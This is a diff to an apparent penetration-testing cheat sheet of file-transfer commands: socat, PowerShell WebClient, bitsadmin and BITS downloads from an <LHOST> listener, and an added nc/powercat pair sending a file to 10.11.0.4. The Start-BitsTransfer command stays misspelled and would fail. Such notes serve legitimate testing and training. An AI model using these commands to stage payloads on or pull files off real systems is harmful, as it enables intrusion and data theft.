@@ -15,7 +15,7 @@ socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork file:f
 ```bash
 socat OPENSSL:<LHOST>:<LPORT>,verify=0 file:file.txt,create
 ```
-## Powershell trasnfer: using .Net WebClient:
+## Powershell transfer: using .Net WebClient:
 ```powershell
 (New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)
 ```
@@ -52,4 +52,13 @@ bitsadmin /transfer myDownloadJob /download /priority high http://<LHOST>:<LPORT
 ## using powershell `Start-BitsTransfer`
 ```powershell
 Start-BitsTrasnfer -Source "HTTP://<LHOST>:<LPORT>/<FILE_NAME>" -Destination c:\windows\temp\<FILE_NAME>
+```
+## using powercat
+### on receiving end:
+```bash
+nc -lnvp 443 > incoming.exe
+```
+### on sending end:
+```powershell
+powercat -c 10.11.0.4 -p 443 -i <PATH\TP\FILE>
 ```
